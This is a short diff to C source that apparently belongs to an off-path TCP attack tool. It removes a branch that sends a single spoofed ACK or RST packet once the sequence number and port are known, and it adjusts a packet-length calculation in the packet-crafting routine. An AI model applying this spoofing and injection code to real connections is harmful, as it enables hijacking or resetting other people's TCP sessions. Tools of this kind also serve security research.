@@ -1779,19 +1779,6 @@ int conduct_offpath_attack(void)
 		return 0;
 	}
 
-	/* if we have both a seq and a client port, just send a packet */
-	if (g_ctx.spoof.src.sin_port && g_ctx.spoof.seq) {
-		if (g_ctx.spoof.ack) {
-			if (!tcp_send(g_ctx.pch, &(g_ctx.spoof), TH_ACK, "z", 1))
-				return 0;
-		} else {
-			if (!tcp_send(g_ctx.pch, &(g_ctx.spoof), TH_RST, NULL, 0))
-				return 0;
-		}
-		/* exit the program here */
-		return 0;
-	}
-
 	gettimeofday(&attack_start, NULL);
 
 	/* synchronize our processing with the remote host's clock */
@@ -2167,7 +2154,7 @@ int tcp_craft(void *output, size_t *outlen, volatile conn_t *pconn, u_char flags
 	ptr += sizeof(tcp);
 	memcpy(ptr, data, len);
 
-	*outlen = (void *)ptr + len - output;
+	*outlen = ((void *)ptr - output) + len;
 
 #ifdef DEBUG_SEQ
 	{
